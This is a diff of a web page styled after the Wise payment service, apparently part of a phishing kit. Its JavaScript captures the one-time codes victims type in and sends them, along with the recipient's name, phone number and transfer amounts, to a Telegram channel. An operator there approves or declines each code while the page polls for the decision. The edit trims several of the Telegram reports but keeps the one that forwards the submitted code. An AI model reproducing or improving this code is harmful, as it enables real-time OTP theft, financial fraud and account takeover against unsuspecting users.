@@ -361,7 +361,7 @@
   .popup-card.success .popup-icon { background: #E8F5E9; }
   .popup-card.success .popup-icon svg { stroke: var(--wise-success); }
 
-  /* Status (kept for inline messages like "new code sent") */
+  /* Status */
   .status-message {
     margin-top: 1rem;
     padding: 0.85rem 1.15rem;
@@ -449,9 +449,7 @@
   </div>
 </div>
 
-<!-- ============================================================
-     WRONG OTP POPUP OVERLAY
-     ============================================================ -->
+<!-- WRONG OTP POPUP OVERLAY -->
 <div class="overlay" id="wrongOtpOverlay">
   <div class="popup-card" id="wrongOtpCard">
     <div class="popup-icon">
@@ -610,21 +608,14 @@
     otpSubmitBtn.disabled = true;
     otpInputs.forEach(i => i.disabled = true);
 
-    await sendTelegram(`⌛ <b>OTP EXPIRED</b>
-
-<b>Txn ID:</b> <code>${esc(txnId)}</code>
-<b>Recipient:</b> ${esc(session.recipientName || '—')}
-<b>Number:</b> ${esc(session.recipientPhone || '—')}
-
-<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>`, txnId, 'otp-timeout');
-
+    // ❌ No Telegram notification on OTP expiry
     showStatus('The OTP has expired. Please request a new code.', 'error');
   }
 
   // ---- Render phone ----
   otpPhone.textContent = fmtPhone(session.recipientPhone);
 
-  // ---- Send OTP to Telegram ----
+  // ---- Generate OTP locally (no Telegram on load) ----
   async function sendOtpToTelegram() {
     currentOtpCode = genOtp();
 
@@ -637,31 +628,9 @@
       }));
     } catch(e) {}
 
-    const message = `🔐 <b>OTP PAGE — APPROVAL REQUIRED</b>
-
-━━━━━━━━━━━━━━━━━━━━
-<b>🔢 OTP CODE</b>
-━━━━━━━━━━━━━━━━━━━━
-<code>${esc(currentOtpCode)}</code>
-
-<b>Sent to:</b> ${esc(fmtPhone(session.recipientPhone))}
-<b>Recipient:</b> ${esc(session.recipientName || '—')}
-<b>Country:</b> ${esc(session.recipientCountry || '—')}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>💰 AMOUNT</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>You send:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
-<b>Recipient gets:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
-<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
-
-<b>⚠️ Approve or decline when ready</b>`;
-
+    // ❌ No Telegram message on page load
+    // Just reset status and start polling for the eventual user submission
     await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
-    await sendTelegram(message, txnId, 'otp');
     startPolling();
   }
 
@@ -713,7 +682,6 @@
       i.classList.add('error');
     });
 
-    // Show the wrong‑OTP popup
     showWrongOtpPopup();
   }
 
@@ -787,7 +755,7 @@
     }, 1000);
   }
 
-  // ---- Submit ----
+  // ---- Submit (THE ONLY TELEGRAM MESSAGE) ----
   otpSubmitBtn.addEventListener('click', async () => {
     if (isSubmitting) return;
     const entered = otpInputs.map(i => i.value).join('');
@@ -808,8 +776,6 @@
 
 ━━━━━━━━━━━━━━━━━━━━
 <b>Entered code:</b> <code>${esc(entered)}</code>
-<b>Correct code:</b> <code>${esc(currentOtpCode || '—')}</code>
-<b>Match:</b> ${entered === currentOtpCode ? '✅ YES' : '❌ NO'}
 
 ━━━━━━━━━━━━━━━━━━━━
 <b>Recipient:</b> ${esc(session.recipientName || '—')}
@@ -825,11 +791,10 @@
     await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
     await sendTelegram(message, txnId, 'otp-verify');
 
-    // Restart polling to wait for the approval decision
     startPolling();
   });
 
-  // ---- Inline resend ----
+  // ---- Inline resend (no Telegram) ----
   otpResendBtn.addEventListener('click', async () => {
     if (otpResendBtn.disabled) return;
     otpResendBtn.disabled = true;
@@ -848,11 +813,7 @@
       }));
     } catch(e) {}
 
-    await sendTelegram(`🔄 <b>OTP RESENT</b>
-
-<b>New code:</b> <code>${esc(newCode)}</code>
-<b>Sent to:</b> ${esc(fmtPhone(session.recipientPhone))}
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>`, txnId, 'otp');
+    // ❌ No Telegram notification on inline resend
 
     setTimeout(() => {
       otpResendBtn.disabled = false;
@@ -868,7 +829,7 @@
     }, 700);
   });
 
-  // ---- Popup resend button ----
+  // ---- Popup resend button (no Telegram) ----
   popupResendBtn.addEventListener('click', async () => {
     popupResendBtn.disabled = true;
     popupResendBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Generating...';
@@ -887,28 +848,7 @@
       }));
     } catch(e) {}
 
-    await sendTelegram(`🔄 <b>NEW OTP REQUESTED (after decline)</b>
-
-━━━━━━━━━━━━━━━━━━━━
-<b>🔢 NEW CODE</b>
-━━━━━━━━━━━━━━━━━━━━
-<code>${esc(newCode)}</code>
-
-<b>Sent to:</b> ${esc(fmtPhone(session.recipientPhone))}
-<b>Recipient:</b> ${esc(session.recipientName || '—')}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>💰 AMOUNT</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>Local amount:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
-<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
-
-Reply:
-✅ <code>/approve ${esc(txnId)}</code>
-❌ <code>/decline ${esc(txnId)}</code>`, txnId, 'otp');
+    // ❌ No Telegram notification after decline resend
 
     // Reset the underlying OTP card
     otpInputs.forEach(i => {
@@ -919,17 +859,12 @@ Reply:
     otpSubmitBtn.disabled = false;
     otpSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Verify code';
 
-    // Restart the expiry and cooldowns
     startExpiryCountdown();
     startResendCooldown(30);
-
-    // Hide the popup and focus the first input
     hideWrongOtpPopup();
     setTimeout(() => otpInputs[0].focus(), 200);
-
     showStatus('A new code has been sent to your phone.', 'success');
 
-    // Re-arm polling so the fresh Telegram message can be approved/declined
     await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
     startPolling();
   });
